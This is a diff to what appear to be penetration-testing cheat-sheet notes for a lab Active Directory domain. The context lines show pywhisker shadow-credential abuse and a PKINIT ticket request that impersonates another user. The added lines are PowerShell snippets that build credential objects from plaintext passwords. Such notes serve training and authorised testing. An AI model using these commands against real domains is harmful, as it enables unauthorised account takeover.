@@ -1513,13 +1513,21 @@ $ pywhisker --dc-ip 10.129.234.109 -d INLANEFREIGHT.LOCAL -u wwhite -p 'package5
 $ python3 gettgtpkinit.py -cert-pfx ../eFUVVTPf.pfx -pfx-pass 'bmRH4LK7UwPrAOfvIx6W' -dc-ip 10.129.234.109 INLANEFREIGHT.LOCAL/jpinkman /tmp/jpinkman.ccache
 ```
 
-- Create a PSCredential Object
+- Create a PSCredential Object (username, password, domain)
+
+```
+$user = "<domain>\<username>"
+$Password = ConvertTo-SecureString "<password>" -AsPlainText -Force
+$credentials = New-Object System.Management.Automation.PSCredential ($user, $Password)
+```
+
+- Create a PSCredential Object (password, domain)
 
 ```
 PS C:\> $SecPassword = ConvertTo-SecureString '<password>' -AsPlainText -Force; $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
 ```
 
-- Create a SecureString Object
+- Create a SecureString Object (password>
 
 ```
 PS C:\> $password = ConvertTo-SecureString '<password>' -AsPlainText -Force
